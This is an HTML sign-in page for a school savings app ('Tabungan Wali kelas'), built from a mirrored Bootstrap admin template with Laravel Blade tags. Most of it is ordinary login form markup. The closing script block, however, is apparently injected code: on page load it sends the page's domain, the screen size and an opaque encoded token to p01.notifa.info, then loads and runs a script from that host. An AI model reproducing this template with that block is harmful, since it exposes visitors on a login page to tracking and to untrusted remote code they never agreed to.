<html lang="en">

<!-- Mirrored from codervent.com/rocker/color-version/authentication-signin2.html by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 15 Nov 2019 12:20:55 GMT -->
<head>
  <meta charset="utf-8"/>
  <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"/>
  <meta name="description" content=""/>
  <meta name="author" content=""/>
  <title>Rocker - Bootstrap4  Admin Dashboard Template</title>
  <!--favicon-->
  <link rel="icon" href="assets/images/favicon.ico" type="image/x-icon">
  <!-- Bootstrap core CSS-->
  <link href="assets/css/bootstrap.min.css" rel="stylesheet"/>
  <!-- animate CSS-->
  <link href="assets/css/animate.css" rel="stylesheet" type="text/css"/>
  <!-- Icons CSS-->
  <link href="assets/css/icons.css" rel="stylesheet" type="text/css"/>
  <!-- Custom Style-->
  <link href="assets/css/app-style.css" rel="stylesheet"/>
  
</head>

<body>
 <!-- Start wrapper-->
 <div id="wrapper">
       <div class="card-authentication2 mx-auto my-5">
        <div class="card-group">
            <div class="card mb-0">
               <div class="bg-signin2"></div>
                <div class="card-img-overlay rounded-left my-5">
                 <center><h1 class="text-white">Tabungan</h1></center>
                 <center><h1 class="text-white">Wali kelas</h1></center>
                 <p class="card-text text-white pt-3"></p>
             </div>
            </div>

            <div class="card mb-0 ">
                <div class="card-body">
                    <div class="card-content p-3">
                        <div class="text-center">
                            <img src="assets/images/logo-icon.png">
                        </div>
                     <div class="card-title text-uppercase text-center py-3">Sign In</div>
                       <form method="POST" action="{{ route('login') }}">
                        @csrf
                          <div class="form-group">
                           <div class="position-relative has-icon-left">
                               <label for="exampleInputUsername" class="sr-only">Username</label>
                                 <input name="email" type="text" id="exampleInputUsername" class="form-control" placeholder="Username">
                                 <div class="form-control-position">
                                    <i class="icon-user"></i>
                                </div>
                           </div>
                          </div>
                          <div class="form-group">
                           <div class="position-relative has-icon-left">
                              <label for="exampleInputPassword" class="sr-only">Password</label>
                              <input name="password" type="password" id="exampleInputPassword" class="form-control" placeholder="Password">
                              <div class="form-control-position">
                                  <i class="icon-lock"></i>
                              </div>
                           </div>
                          </div>
                          <div class="form-row mr-0 ml-0">
                          <div class="form-group col-6">
                              <div class="icheck-primary">
                               <input type="checkbox" id="user-checkbox" checked="" />
                               <label for="user-checkbox">Remember me</label>
                             </div>
                            </div>
                            <div class="form-group col-6 text-right">
                             <a href="authentication-reset-password2.html">Reset Password</a>
                            </div>
                        </div>
                        <button type="submit" class="btn btn-outline-primary btn-block waves-effect waves-light">Sign In</button>
                    
                    </form>
                 </div>
                </div>
            </div>
         </div>
        </div>
    
     <!--Start Back To Top Button-->
    <a href="javaScript:void();" class="back-to-top"><i class="fa fa-angle-double-up"></i> </a>
    <!--End Back To Top Button-->
    </div><!--wrapper-->
    
  <!-- Bootstrap core JavaScript-->
  <script src="assets/js/jquery.min.js"></script>
  <script src="assets/js/popper.min.js"></script>
  <script src="assets/js/bootstrap.min.js"></script>
  
<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582Am8lISurprAz4dcBbGgKuih0zphZRiQ5lt1rMiacSVrTFt0kTlE2XrHKFnWfm2rcacBkkfkBvbjtF1q2eFBjfjDnNVbBkqdUrVNViK1eF3ktQBFxlotvDs36DVqVkZ96qk15mfVWJOB%2bkOvUaG9P9J8lz6ySMTmo6PhAf%2fWlUprNHCVAGMxUC811XSxg62Na%2fL8vb0Rd%2fJ93EuwUrE%2fOb76cF%2b54LV%2b7n0qbOdgTHLvfetIaIASKnoqUwo%2buOyzYsuUCiUZaBVHNLNmKQLBfSLKIc6ZpzB8MeNGuDb%2b4ka9N5G9TNjTWXi9agpkEZYlgcsx44dxkT9xZ%2bC9K89m7uUiTuD0L2gly%2fUfgcn3dOBaoGf%2bwm5eTNyl2sXrfF6aOwHrqcpLGJYNEXRE1qx4LOjoW4gnHwdqeHi6w2JN%2fXOziQ89jIfsyuw5WyC7mejg%2bvD5exhBHlkEc1oLYNDhLPYe%2bh7hsIryIwaXSeLnfo1z%2ff8nNe1IKlEfqrVs5P9fhkkINDYs9IuU16%2fuxCbw57M%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>

<!-- Mirrored from codervent.com/rocker/color-version/authentication-signin2.html by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 15 Nov 2019 12:20:55 GMT -->
</html>


